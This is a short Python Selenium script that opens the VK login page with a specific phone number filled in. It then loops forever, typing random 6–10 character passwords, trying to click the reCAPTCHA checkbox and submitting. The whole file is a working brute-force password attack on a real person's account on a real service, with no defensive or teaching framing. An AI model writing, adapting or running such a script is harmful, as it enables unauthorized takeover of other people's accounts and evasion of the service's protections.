from selenium import webdriver
import os, random


chrome_opt = webdriver.ChromeOptions()
chrome_opt.add_argument('--disable-gpu')

driver = webdriver.Chrome(executable_path='D:\\Тигран\\chromedriver\\chromedriver', chrome_options=chrome_opt) 

driver.get('https://vk.com/login?m=1&email=37497280121')

symbols = '0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'

def passwordCheck():
    password = ''
    n = random.randint(6, 10)
    for i in range(n):
        password+=symbols[random.randint(0, len(symbols)-1)]
    return password

# driver.find_element_by_id("email").send_keys("37497280121")
while True:
    driver.find_element_by_id("pass").send_keys(passwordCheck())
    try:
        driver.find_element_by_class_name('recaptcha-checkbox-border').click()
    except:
        try: 
            print(driver.find_element_by_class_name('recaptcha-checkbox-border'))
        except:
            print('captcha doesn\'t found')
    driver.find_element_by_id("pass").submit()

